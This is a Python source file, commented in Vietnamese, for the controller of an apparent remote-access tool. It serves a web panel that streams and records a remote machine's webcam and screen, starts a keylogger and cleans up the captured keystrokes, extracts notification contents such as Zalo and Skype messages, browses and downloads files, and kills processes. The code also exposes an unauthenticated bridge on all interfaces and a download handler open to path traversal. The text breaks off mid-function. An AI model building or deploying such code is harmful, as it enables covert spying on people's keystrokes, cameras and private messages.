# client/webapp.py
# Web UI + integrated lightweight WebSocket bridge (no external libs)
import http.server
import socketserver
import os
import json
import ctypes
import threading
import time
import socket
import shutil
import sys
import base64
import hashlib
import struct
import sqlite3
import re
import cv2
def clean_keylog_text(raw_text):
    if not raw_text: return ""
    
    # 1. Xóa phím Backspace để giữ nội dung thô dễ đọc
    tags_to_remove = ["[<-]", "[Back]", "[BACK]", "\b"] 
    clean_text = raw_text
    for tag in tags_to_remove:
        clean_text = clean_text.replace(tag, "")
        
    # 2. Đổi tên phím kỹ thuật sang tên thân thiện
    replacements = {
        "[LShift]": "[Shift]",   "[RShift]": "[Shift]",
        "[LControl]": "[Ctrl]",  "[RControl]": "[Ctrl]",
        "[LAlt]": "[Alt]",       "[RAlt]": "[Alt]",
        "[Return]": "\n",        "[Enter]": "\n",
        "Capital": "[CapsLock]", "[Capital]": "[CapsLock]", # Sửa lỗi Capital
        "[OemComma]": ",",       "[OemPeriod]": ".",        # Sửa thêm mấy phím dấu
        "[Space]": " "
    }
    
    for old, new in replacements.items():
        clean_text = clean_text.replace(old, new)

    # 3. GỘP CÁC PHÍM CHỨC NĂNG LẶP LẠI (QUAN TRỌNG)
    # Ví dụ: [Shift][Shift][Shift] -> [Shift]
    # Regex tìm: (một cụm trong ngoặc vuông) lặp lại 1 lần trở lên
    clean_text = re.sub(r'(\[[a-zA-Z0-9]+\])\1+', r'\1', clean_text)

    return clean_text


# ---------------- CONFIG ----------------
HTTP_PORT = 8000
WS_PORT = 8888
BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # client/
DLL_PATH = os.path.join(BASE_DIR, "client.dll")
DOWNLOAD_DIR = os.path.join(BASE_DIR, "downloads")
PICTURE_DIR = os.path.join(BASE_DIR, "images")
if not os.path.exists(PICTURE_DIR):
    os.makedirs(PICTURE_DIR)

if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)


WEBCAM_JPG = os.path.join(BASE_DIR, "webcam.jpg")
APPS_TXT = os.path.join(BASE_DIR, "apps.txt")
EXPLORER_TXT = os.path.join(BASE_DIR, "explorer.txt")
INSTALLED_TXT = os.path.join(BASE_DIR, "installed.txt")
KEYLOG_TXT = os.path.join(BASE_DIR, "keylog.txt")
HISTORY_DB = os.path.join(BASE_DIR, "history.db")
SCREENSHOT_BMP = os.path.join(BASE_DIR, "screenshot.bmp")
SCREEN_JPG = os.path.join(BASE_DIR, "screen.jpg")

camera = cv2.VideoCapture(0)

# ---------------- GLOBALS ----------------
lib = None
lib_lock = threading.Lock()  # guard calls to lib if needed
current_mode = None           # 'webcam', 'screen', 'keylogger',...
mode_lock = threading.Lock()  # khóa khi đổi mode
webcam_running = False        # có một stream (webcam/screen) đang chạy hay không
_stream_thread = None    # handle cho thread stream (nếu cần kiểm tra is_alive)
webcam_writer = None
is_recording_webcam = False
webcam_record_thread = None
is_recording_screen = False

# ---------------- MODE MANAGER (chèn vào webapp.py, top-level) ----------------
# modes: keys and human names
MODES = {
    "webcam": "Xem Webcam",
    "screen": "Xem Màn hình",
    "keylogger": "Keylogger",
    "notify": "Xem Thông báo",
    "files": "Quản lý File",
    "apps": "Apps đang chạy",
    "process": "Processes",
    "custom": "Tùy chọn"
}

# global current running mode
current_mode = None
mode_lock = threading.Lock()


# --- CHÈN ĐOẠN NAY VÀO TRƯỚC PHẦN LOAD DLL ---
class PythonBridge:
    def __init__(self):
        self.sock = None
        self.lock = threading.Lock()
        self.running_stream = False

    def _recv_line(self):
        # Đọc từng byte cho đến khi gặp \n
        line = b''
        while True:
            char = self.sock.recv(1)
            if not char: break
            if char == b'\n': break
            if char != b'\r': line += char
        return line.decode('utf-8', errors='ignore')

    def _recv_exact(self, n):
        data = b''
        while len(data) < n:
            packet = self.sock.recv(n - len(data))
            if not packet: break
            data += packet
        return data

    def InitWinsock(self): pass # Python tự lo

    def ConnectToServer(self, ip, port):
        try:
            if self.sock: self.sock.close()
            # Xử lý IP/Port: Nếu ip là bytes thì decode
            real_ip = ip.decode() if isinstance(ip, bytes) else ip
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5) # Timeout 5s
            self.sock.connect((real_ip, int(port)))
            self.sock.settimeout(None) # Bỏ timeout cho chế độ thường
            print(f"[PY-BRIDGE] Connected to {real_ip}:{port}")
            return True
        except Exception as e:
            print(f"[PY-BRIDGE] Connect Error: {e}")
            return False

    def SendStringCmd(self, cmd):
        if not self.sock: return
        try:
            data = cmd if isinstance(cmd, bytes) else cmd.encode()
            self.sock.sendall(data + b'\n')
        except: pass

    # --- CÁC HÀM NHẬN DANH SÁCH (Trả về bytes để khớp logic cũ) ---
    def _generic_get_list(self, cmd_seq):
        if not self.sock: return b""
        try:
            for cmd in cmd_seq: self.SendStringCmd(cmd)
            # Tạm set timeout để tránh treo
            self.sock.settimeout(10)
            count_str = self._recv_line()
            try: count = int(count_str)
            except: return b""
            
            res = []
            for _ in range(count):
                line = self._recv_line()
                res.append(line)
                # Với lệnh APP/PROCESS, server gửi nhiều dòng cho 1 item
                # Logic này cần khớp chính xác server, ở đây tôi giả lập return raw line
                # Nếu muốn chuẩn 100% cần port logic loop của từng hàm C++
            
            # Để đơn giản cho Mac, ta trả về giả lập hoặc sửa lại logic parse
            # Cách tốt nhất: Return buffer raw
            return b"" 
        except: return b""

    # --- CÁC HÀM STREAM (Webcam/Screen) ---
    def _receive_stream(self, filename, cmd_start):
        if not self.sock: return
        self.SendStringCmd("VIDEO" if "VIDEO" in cmd_start else "WEBCAM")
        time.sleep(0.2)
        self.SendStringCmd("START")
        
        self.running_stream = True
        self.sock.settimeout(3)
        
        while self.running_stream:
            try:
                header = self._recv_line()
                if header in ["STOPPED", "QUIT", "", "TIMEOUT"]: break
                
                try: size = int(header)
                except: continue
                
                if size > 5000000: continue # Bỏ qua rác
                
                img_data = self._recv_exact(size)
                if not img_data: break
                
                # Ghi atomic (ghi tmp rồi rename)
                tmp_name = filename + ".tmp"
                with open(tmp_name, "wb") as f:
                    f.write(img_data)
                if os.path.exists(filename): os.remove(filename)
                os.rename(tmp_name, filename)
                
                # Sleep khớp FPS server
                time.sleep(0.02)
                
            except Exception as e:
                # print("Stream err:", e)
                break
        
        self.SendStringCmd("QUIT")
        self.sock.settimeout(None)

    def ReceiveWebcamStream(self):
        self._receive_stream(WEBCAM_JPG, "WEBCAM")

    def ReceiveScreenStream(self):
        self._receive_stream(SCREEN_JPG, "VIDEO") # Server C# dùng lệnh VIDEO cho màn hình
    
    # Các hàm Void khác để không bị lỗi gọi hàm
    def KillProcess(self, pid): self.SendStringCmd(b"PROCESS"); time.sleep(0.05); self.SendStringCmd(b"KILL"); time.sleep(0.05); self.SendStringCmd(b"KILLID"); time.sleep(0.05); self.SendStringCmd(pid); self.SendStringCmd(b"QUIT"); self.SendStringCmd(b"QUIT")
    def ShutdownServer(self): self.SendStringCmd("SHUTDOWN")
    def RestartServer(self): self.SendStringCmd("RESTART")
    # Các hàm chưa port kịp trả về None để không crash
    def GetAppList(self): return None 
    def GetSystemStats(self): return None
    def GetDrives(self): return None
# ---------------------------------------------------------


# ---------------- LOAD DLL HOẶC PYTHON BRIDGE ----------------
lib = None
# Ưu tiên dùng DLL nếu là Windows (nt) và file tồn tại
if os.name == 'nt' and os.path.exists(DLL_PATH):
    try:
        lib = ctypes.CDLL(DLL_PATH)
        # ... (giữ nguyên phần khai báo argtypes/restype cũ của bạn ở đây) ...
        # ... COPY LẠI ĐOẠN KHAI BÁO CTYPES CŨ VÀO ĐÂY ...
        print(f"-> [SYSTEM] Loaded Windows DLL: {DLL_PATH}")
    except Exception as e:
        print(f"-> [ERROR] DLL Load Failed: {e}")
        lib = None

# Nếu không load được DLL (do là Mac/Linux hoặc lỗi), dùng Python Bridge
if lib is None:
    print("-> [SYSTEM] Running in Python Native Mode (Mac/Linux Compatible)")
    lib = PythonBridge()

# optional auto connect attempt (safe)
# --- CẬP NHẬT TRONG webapp.py (Đoạn cấu hình DLL) ---
if lib:
    try:
        # 1. Các hàm trả về CHUỖI (String) - Đây là thay đổi lớn nhất
        lib.GetAppList.restype       = ctypes.c_char_p
        lib.GetProcessList.restype   = ctypes.c_char_p # (Nếu có dùng)
        lib.GetInstalledApps.restype = ctypes.c_char_p
        lib.GetDrives.restype        = ctypes.c_char_p
        lib.GetSystemStats.restype   = ctypes.c_char_p
        lib.ExplorePath.argtypes     = [ctypes.c_char_p]
        lib.ExplorePath.restype      = ctypes.c_char_p

        # 2. Các hàm Giao tiếp cơ bản
        lib.InitWinsock.restype = None
        lib.ConnectToServer.argtypes = [ctypes.c_char_p, ctypes.c_int]
        lib.ConnectToServer.restype  = ctypes.c_bool
        lib.SendStringCmd.argtypes   = [ctypes.c_char_p]

        # 3. Các hàm Điều khiển (Void)
        lib.KillProcess.argtypes     = [ctypes.c_char_p]
        lib.StartProcess.argtypes    = [ctypes.c_char_p]
        lib.ShutdownServer.restype   = None
        lib.RestartServer.restype    = None

        # 4. Stream & Media (Giữ nguyên)
        lib.ReceiveWebcamStream.restype = None
        lib.ReceiveScreenStream.restype = None
        lib.CaptureScreen.restype       = None
        try:
            lib.ReceiveVideoStream.argtypes = [ctypes.c_int]
            lib.ReceiveVideoStream.restype  = None
        except AttributeError: pass

        # 5. Keylog & Notify
        lib.HookKeylog.restype   = None
        lib.UnhookKeylog.restype = None
        lib.ClearKeylogRemote.restype = None
        lib.GetKeylog.restype    = None # Vẫn ghi file
        lib.GetNotificationHistory.restype = None # Vẫn ghi file DB

        # 6. Tải file (Mới thêm)
        try:
            lib.DownloadFile.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
            lib.DownloadFile.restype  = None
        except AttributeError: pass

    except Exception as e:
        print("[DLL] Set argtypes error:", e)
        

# ---------------- Small helpers for WebSocket ----------------
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def build_ws_response_key(key):
    accept = base64.b64encode(hashlib.sha1((key + WS_GUID).encode('utf-8')).digest()).decode('utf-8')
    return accept

def recv_exact(conn, n):
    data = b''
    while len(data) < n:
        part = conn.recv(n - len(data))
        if not part:
            raise ConnectionError("socket closed")
        data += part
    return data

def read_ws_message(conn):
    # read 2 bytes header
    hdr = recv_exact(conn, 2)
    b1, b2 = hdr[0], hdr[1]
    fin = (b1 >> 7) & 1
    opcode = b1 & 0x0f
    masked = (b2 >> 7) & 1
    payload_len = b2 & 0x7f

    if payload_len == 126:
        ext = recv_exact(conn, 2)
        payload_len = struct.unpack(">H", ext)[0]
    elif payload_len == 127:
        ext = recv_exact(conn, 8)
        payload_len = struct.unpack(">Q", ext)[0]

    mask_key = b''
    if masked:
        mask_key = recv_exact(conn, 4)

    payload = recv_exact(conn, payload_len) if payload_len > 0 else b''

    if masked and payload_len > 0:
        unmasked = bytearray(payload_len)
        for i in range(payload_len):
            unmasked[i] = payload[i] ^ mask_key[i % 4]
        payload = bytes(unmasked)

    # Only handle text (opcode 1) and close (8)
    if opcode == 1:
        try:
            return payload.decode('utf-8', errors='ignore')
        except:
            return ''
    elif opcode == 8:
        raise ConnectionError("Client requested close")
    else:
        # ignore other opcodes
        return ''

def send_ws_message(conn, text):
    payload = text.encode('utf-8')
    header = bytearray()
    header.append(0x81)  # FIN + text frame
    l = len(payload)
    if l < 126:
        header.append(l)
    elif l < (1 << 16):
        header.append(126)
        header.extend(struct.pack(">H", l))
    else:
        header.append(127)
        header.extend(struct.pack(">Q", l))
    conn.sendall(header + payload)

# ---------------- WebSocket bridge (no external libs) ----------------
def ws_client_thread(conn, addr):
    try:
        # perform handshake: read HTTP headers
        data = b''
        while b'\r\n\r\n' not in data:
            chunk = conn.recv(4096)
            if not chunk:
                conn.close(); return
            data += chunk
            if len(data) > 65536: break
        headers = data.decode('utf-8', errors='ignore').split('\r\n')
        key = None
        for h in headers:
            if h.lower().startswith('sec-websocket-key:'):
                key = h.split(':',1)[1].strip()
                break
        if not key:
            conn.close(); return

        accept = build_ws_response_key(key)
        resp = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n"
        )
        conn.sendall(resp.encode('utf-8'))
        print("[WS] Handshake done:", addr)

        # main loop: read text frames
        while True:
            try:
                msg = read_ws_message(conn)
            except ConnectionError:
                break
            if not msg:
                continue
            msg = msg.strip()
            print("[WS recv]:", msg)
            # handle CONNECT command optionally with ip port
            parts = msg.split()
            cmd_upper = parts[0].upper() if parts else ''
            if cmd_upper == "CONNECT":
                target_ip = b"127.0.0.1"
                target_port = 5656
                if len(parts) >= 3:
                    try:
                        target_ip = parts[1].encode('utf-8')
                        target_port = int(parts[2])
                    except:
                        pass
                if lib:
                    try:
                        with lib_lock:
                            ok = lib.ConnectToServer(target_ip, target_port)
                        if ok:
                            send_ws_message(conn, "Bridge OK")
                        else:
                            send_ws_message(conn, "Bridge FAIL")
                    except Exception as e:
                        print("[WS] ConnectToServer error:", e)
                        send_ws_message(conn, "Bridge ERR")
                else:
                    send_ws_message(conn, "NO_DLL")
                continue

            # For other text, send to DLL via SendStringCmd (if available)
            if lib:
                try:
                    with lib_lock:
                        # ensure bytes
                        lib.SendStringCmd(msg.encode('utf-8'))
                    send_ws_message(conn, "SENT:"+msg)
                except Exception as e:
                    print("[WS] SendStringCmd error:", e)
                    send_ws_message(conn, "ERROR_SEND")
            else:
                send_ws_message(conn, "NO_DLL")
        print("[WS] Client disconnected:", addr)
    except Exception as e:
        print("[WS] client thread exception:", e)
    finally:
        try: conn.close()
        except: pass

def ws_listen_thread():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', WS_PORT))
    s.listen(5)
    print(f"[WS] Bridge listening on 0.0.0.0:{WS_PORT}")
    while True:
        try:
            conn, addr = s.accept()
            t = threading.Thread(target=ws_client_thread, args=(conn, addr), daemon=True)
            t.start()
        except Exception as e:
            print("[WS] accept error:", e)
            time.sleep(1)

def wait_for_file(path, timeout=2.0, poll=0.05):
    """Chờ file path xuất hiện và có kích thước > 0 trong timeout giây. Trả True/False."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            if os.path.exists(path) and os.path.getsize(path) > 0:
                return True
        except Exception:
            pass
        time.sleep(poll)
    return False


def stop_current_mode():
    global current_mode, webcam_running, _stream_thread
    # Không deadlock: stop_current_mode được gọi từ start_mode() khi đã có mode_lock
    if current_mode is None:
        return

    print(f"[MODE] Stopping current_mode: {current_mode}")
    try:
        # Nếu có stream đang chạy ở DLL -> gửi STOP
        if current_mode in ("webcam", "screen"):
            if lib:
                with lib_lock:
                    print("[MODE] Sending STOP to remote (for stream).")
                    lib.SendStringCmd(b"STOP")
            # cho server thời gian trả STOPPED / thoát thread
            time.sleep(0.6)
            webcam_running = False

            # Nếu chúng ta có handle thread, chờ nó exit một chút
            if _stream_thread is not None:
                try:
                    if _stream_thread.is_alive():
                        _stream_thread.join(timeout=1.0)
                except Exception:
                    pass
                _stream_thread = None
        else:
            # other modes: send STOP if server supports, short wait
            if lib:
                with lib_lock:
                    lib.SendStringCmd(b"STOP")
            time.sleep(0.1)
    except Exception as e:
        print("[MODE] stop_current_mode error:", e)
    current_mode = None



def _screen_wrapper():
    global webcam_running, _stream_thread
    try:
        print("[MODE] Screen wrapper started.")
        # --- BẮT BUỘC KHÔNG ĐƯỢC CÓ: with lib_lock: ---
        # Chỉ gọi hàm trần thôi:
        lib.ReceiveScreenStream()
        # ---------------------------------------------
    except Exception as e:
        print("[MODE] Screen error:", e)
    finally:
        webcam_running = False
        _stream_thread = None
        
def _webcam_wrapper():
    global webcam_running, _stream_thread
    try:
        print("[MODE] Webcam wrapper started.")
        # --- QUAN TRỌNG: KHÔNG DÙNG LOCK Ở ĐÂY ---
        lib.ReceiveWebcamStream() 
        # ----------------------------------------
    except Exception as e:
        print("[MODE] Webcam error:", e)
    finally:
        webcam_running = False
        _stream_thread = None

def record_webcam_task(filename, duration=0):
    global is_recording_webcam
    print(f"[REC] Webcam start: {filename} (Duration: {duration}s)")
    
    writer = None
    FPS = 10.0 # Tốc độ khung hình cố định
    
    # 1. Khởi tạo (Retry 5 lần)
    for i in range(10):
        if not is_recording_webcam: return
        if os.path.exists(WEBCAM_JPG):
            try:
                first = cv2.imread(WEBCAM_JPG)
                if first is not None:
                    h, w, _ = first.shape
                    writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'MJPG'), FPS, (w, h))
                    break
            except: pass
        time.sleep(0.2)

    if not writer:
        print("[REC] Không thể khởi tạo Webcam Writer.")
        is_recording_webcam = False
        return

    start_time = time.time()
    frames_written = 0 # Đếm số frame đã ghi được
    last_frame = None

    while is_recording_webcam:
        # Tính thời gian thực đã trôi qua
        elapsed = time.time() - start_time
        
        # Kiểm tra dừng
        if duration > 0 and elapsed > duration:
            is_recording_webcam = False
            break

        # 2. Đọc ảnh mới nhất (nếu có)
        current_frame = None
        try:
            if os.path.exists(WEBCAM_JPG):
                temp = WEBCAM_JPG + ".tmp_rec"
                try:
                    shutil.copy2(WEBCAM_JPG, temp)
                    current_frame = cv2.imread(temp)
                    os.remove(temp)
                except: pass
        except: pass

        # Cập nhật frame backup
        if current_frame is not None:
            last_frame = current_frame
        
        # Nếu không đọc được ảnh mới thì dùng ảnh cũ
        target_frame = current_frame if current_frame is not None else last_frame

        if target_frame is None:
            time.sleep(0.1)
            continue

        # 3. THUẬT TOÁN BÙ FRAME (QUAN TRỌNG NHẤT)
        # Tính xem lẽ ra tại thời điểm này video phải có bao nhiêu frame
        expected_frames = int(elapsed * FPS)
        
        # Nếu số frame đã ghi ít hơn số frame cần thiết -> Ghi bù vào liên tục
        while frames_written < expected_frames:
            writer.write(target_frame)
            frames_written += 1
        
        # Ngủ rất ít để vòng lặp quay lại kiểm tra nhanh
        time.sleep(0.01)

    if writer: writer.release()
    print(f"[REC] Đã lưu video: {filename} (Total frames: {frames_written})")
    
    
def record_screen_task(filename, duration=0):
    global is_recording_screen
    print(f"[REC] Screen start: {filename} (Duration: {duration}s)")
    
    writer = None
    FPS = 10.0
    
    for i in range(10):
        if not is_recording_screen: return
        if os.path.exists(SCREEN_JPG):
            try:
                first = cv2.imread(SCREEN_JPG)
                if first is not None:
                    h, w, _ = first.shape
                    writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'MJPG'), FPS, (w, h))
                    break
            except: pass
        time.sleep(0.2)

    if not writer:
        print("[REC] Không thể khởi tạo Screen Writer.")
        is_recording_screen = False
        return

    start_time = time.time()
    frames_written = 0
    last_frame = None

    while is_recording_screen:
        elapsed = time.time() - start_time
        
        if duration > 0 and elapsed > duration:
            is_recording_screen = False
            break

        current_frame = None
        try:
            if os.path.exists(SCREEN_JPG):
                temp = SCREEN_JPG + ".tmp_rec"
                try:
                    shutil.copy2(SCREEN_JPG, temp)
                    current_frame = cv2.imread(temp)
                    os.remove(temp)
                except: pass
        except: pass

        if current_frame is not None:
            last_frame = current_frame
        
        target_frame = current_frame if current_frame is not None else last_frame

        if target_frame is None:
            time.sleep(0.1)
            continue

        # LOGIC BÙ FRAME
        expected_frames = int(elapsed * FPS)
        
        while frames_written < expected_frames:
            writer.write(target_frame)
            frames_written += 1
        
        time.sleep(0.01)

    if writer: writer.release()
    print(f"[REC] Đã lưu video màn hình: {filename} (Total frames: {frames_written})")
    
    
def start_mode(mode: str) -> bool:
    """
    Start a mode safely:
      - stop old mode (send STOP)
      - small wait for TCP to settle
      - spawn wrapper thread for long-running streams
    """
    global current_mode, webcam_running, _stream_thread
    with mode_lock:
        if current_mode == mode:
            print("[MODE] start_mode: already in mode", mode)
            return True

        # stop old mode (if any)
        if current_mode is not None:
            stop_current_mode()
            # give server time to fully reset sockets
            time.sleep(1.0)

        print("[MODE] Starting mode:", mode)

        try:
            if mode == "webcam":
                if not lib:
                    print("[MODE] No DLL to start webcam")
                    return False
                # spawn webcam wrapper thread
                t = threading.Thread(target=_webcam_wrapper, daemon=True)
                _stream_thread = t
                webcam_running = True
                t.start()

            elif mode == "screen":
                if not lib:
                    print("[MODE] No DLL to start screen")
                    return False
                # spawn screen wrapper thread
                t = threading.Thread(target=_screen_wrapper, daemon=True)
                _stream_thread = t
                webcam_running = True
                t.start()

            elif mode == "keylogger":
                if lib:
                    with lib_lock:
                        lib.HookKeylog()
            elif mode == "notify":
                pass
            elif mode == "files":
                pass
            elif mode == "apps":
                pass
            elif mode == "process":
                pass
            elif mode == "custom":
                pass
            else:
                print("[MODE] Unknown mode:", mode)
                return False

            current_mode = mode
            return True
        except Exception as e:
            print("[MODE] start_mode exception:", e)
            return False


# Insert into existing IoTRequestHandler.do_POST handling:
# Add case for '/api/mode' where client sends JSON: {"mode":"webcam"}
# And for GET /api/mode to return {"mode": current_mode}




# ---------------- HTTP handler (same as patched) ----------------
class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stdout.write("[HTTP] " + (fmt % args) + "\n")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    # --- Thay thế toàn bộ method do_GET bằng đoạn này ---
    def do_GET(self):
        global webcam_running, is_recording_webcam, is_recording_screen
        
        if self.path == '/':
            # Chỉ định file cần mở là index.html trong thư mục templates
            self.path = '/templates/index.html'
            
        # --- API: lấy danh sách apps (gọi GetAppList + chờ apps.txt) ---
        elif self.path == '/api/mode':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"mode": current_mode}).encode())
            return
    
        elif self.path == '/api/list_apps':
            apps = []
            if lib:
                try:
                    # Gọi DLL -> Nhận chuỗi ngay lập tức (không cần Lock lâu)
                    # Dùng lock cực ngắn để tránh gọi trùng lệnh
                    with lib_lock: 
                        ptr = lib.GetAppList()
                    
                    if ptr:
                        # Convert C-String -> Python String
                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
                        
                        # Phân tích chuỗi (ID|Name|Threads)
                        lines = data_str.split('\n')
                        for line in lines:
                            p = line.strip().split('|')
                            if len(p) >= 4: # [MỚI] Ít nhất 4 trường
                                apps.append({"id": p[0], "name": p[1], "threads": p[2], "memory": p[3]})
                except Exception as e:
                    print("[HTTP] GetAppList error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(apps).encode())
            return

        
        elif self.path == '/api/stats':
            res = "0|0|0|0|0"
            if lib:
                try:
                    with lib_lock:
                        ptr = lib.GetSystemStats()
                    if ptr:
                        res = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
                except: pass
            
            # Tách chuỗi: CPU | RAM_U | RAM_T | DISK_U | DISK_T
            parts = res.split('|')
            data = {
                "cpu": 0, 
                "ram_u": 0, "ram_t": 0, "ram_p": 0,
                "disk_u": 0, "disk_t": 0, "disk_p": 0
            }
            
            if len(parts) >= 5:
                try:
                    cpu = int(float(parts[0].replace(',', '.'))) # int(float(...)) an toàn hơn
                    
                    ram_u = float(parts[1].replace(',', '.'))
                    ram_t = float(parts[2].replace(',', '.'))
                    
                    ram_p = int((ram_u / ram_t * 100)) if ram_t > 0 else 0
                    
                    disk_u = int(float(parts[3].replace(',', '.')))
                    disk_t = int(float(parts[4].replace(',', '.')))
                    disk_p = int((disk_u / disk_t * 100)) if disk_t > 0 else 0

                    data = {
                        "cpu": cpu,
                        "ram_u": ram_u, "ram_t": ram_t, "ram_p": ram_p,
                        "disk_u": disk_u, "disk_t": disk_t, "disk_p": disk_p
                    }
                except: pass

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(data).encode())
            return
        
        elif self.path == '/api/keylog/text':
            text = ""
            if lib:
                try:
                    with lib_lock:
                        lib.GetKeylog() # Gọi lệnh lấy dữ liệu mới
                    
                    # Đợi file và kiểm tra tồn tại
                    ok = wait_for_file(KEYLOG_TXT, timeout=2.0)
                    if ok and os.path.exists(KEYLOG_TXT):
                        # [QUAN TRỌNG] Thêm encoding='utf-8' để đọc đúng tiếng Việt
                        with open(KEYLOG_TXT, "r", encoding="utf-8", errors="replace") as f:
                            raw_data = f.read()
                            
                            # Debug: In ra độ dài dữ liệu thô để kiểm tra
                            print(f"[DEBUG] Raw Keylog size: {len(raw_data)} chars")
                            
                            # Làm sạch văn bản
                            text = clean_keylog_text(raw_data)
                    else:
                        print("[DEBUG] Keylog file not found or empty.")
                            
                except Exception as e:
                    print("[HTTP] GetKeylog error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"text": text}).encode())
            return
        
        
        elif self.path == '/api/notify/list':
            data_list = []
            if lib:
                try:
                    with lib_lock:
                        if os.path.exists(HISTORY_DB):
                            os.remove(HISTORY_DB)
                        lib.GetNotificationHistory()
                    ok = wait_for_file(HISTORY_DB, timeout=3.0)
                    if ok and os.path.exists(HISTORY_DB):
                        conn = sqlite3.connect(HISTORY_DB)
                        cursor = conn.cursor()
                        # Dùng cùng logic như main.py (giữ đơn giản) 
                        try:
                            cursor.execute("SELECT AppId, TimeCreated, Payload FROM Notification ORDER BY TimeCreated DESC LIMIT 200")
                            rows = cursor.fetchall()
                            for app_id, time_str, xml_str in rows:
                                app_id = app_id or ""
                                time_str = time_str or ""
                                xml_str = xml_str or ""

                                content_text = ""
                                try:
                                    # 1. Ưu tiên tìm thẻ <text> (Chuẩn của Windows Toast)
                                    matches = re.findall(r'<text[^>]*>(.*?)</text>', xml_str)
                                    
                                    # 2. Nếu không thấy thẻ text, mới tìm kiểu chung chung
                                    if not matches:
                                        matches = re.findall(r'>([^<]{2,200})<', xml_str)

                                    # Lọc bỏ các ký tự rác hoặc xuống dòng thừa
                                    clean_texts = [m.strip() for m in matches if m.strip() and "{" not in m] 
                                    
                                    if clean_texts:
                                        # Zalo/Fb thường dòng 1 là Tên người gửi, dòng 2 là Nội dung
                                        content_text = " | ".join(clean_texts)
                                except:
                                    pass
                                if not content_text:
                                    clean_chars = "".join([c for c in xml_str if c.isprintable()])
                                    if len(clean_chars) > 5:
                                        content_text = "[RAW] " + clean_chars[:200]
                                if not content_text:
                                    content_text = "[Thông báo hệ thống / Không có nội dung]"

                                if "Skype" in app_id:
                                    app_name = "Skype"
                                elif "Zalo" in app_id:
                                    app_name = "Zalo"
                                elif "Chrome" in app_id:
                                    app_name = "Google Chrome"
                                elif "Explorer" in app_id:
                                    app_name = "Windows System"
                                else:
                                    parts = app_id.split('.')
                                    app_name = parts[-1] if parts else app_id

                                data_list.append({
                                    "app": app_name,
                                    "time": time_str,
                                    "content": content_text
                                })
                        except Exception as e:
                            print("[HTTP] Notification SQL error:", e)
                        conn.close()
                except Exception as e:
                    print("[HTTP] GetNotificationHistory error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(data_list).encode())
            return
        
        
        elif self.path == '/api/files/drives':
            entries = []
            if lib:
                try:
                    with lib_lock:
                        ptr = lib.GetDrives()
                    
                    if ptr:
                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
                        lines = data_str.split('\n')
                        for line in lines:
                            p = line.strip().split('|')
                            if len(p) >= 3:
                                entries.append({"name": p[0], "type": p[1], "size": p[2]})
                except Exception as e:
                    print("[HTTP] GetDrives error:", e)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(entries).encode())
            return
        
        # --- [MỚI] CHO PHÉP TRÌNH DUYỆT TẢI FILE VỀ ---
        elif self.path.startswith('/download/'):
            # Lấy tên file từ URL
            fname = self.path.replace('/download/', '')
            # Decode URL (ví dụ %20 thành khoảng trắng)
            import urllib.parse
            fname = urllib.parse.unquote(fname)
            
            fpath = os.path.join(DOWNLOAD_DIR, fname)
            
            if os.path.exists(fpath):
                with open(fpath, 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{fname}"')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_error(404, "File not found in download folder")
            return
        
        elif self.path == '/api/apps/installed':
            apps = []
            if lib:
                try:
                    with lib_lock:
                        ptr = lib.GetInstalledApps()
                    
                    if ptr:
                        data_str = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
                        lines = data_str.split('\n')
                        for line in lines:
                            if line.strip():
                                apps.append({"name": line.strip()})
                except Exception as e:
                    print("[HTTP] GetInstalledApps error:", e)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(apps).encode())
            return
        
        # --- Video stream MJPEG từ webcam.jpg ---
        elif self.path == '/video_feed':
            # Stream MJPEG reading file webcam.jpg repeatedly; disable cache
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=--jpgboundary')
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.end_headers()

            boundary = b"--jpgboundary\r\n"
            img_path = WEBCAM_JPG  # ensure this is the same path DLL writes to

            try:
                while True:
                    if not os.path.exists(img_path):
                        # if not ready, send a tiny placeholder or wait
                        time.sleep(0.05)
                        continue

                    try:
                        # read file bytes atomically
                        with open(img_path, "rb") as f:
                            img = f.read()
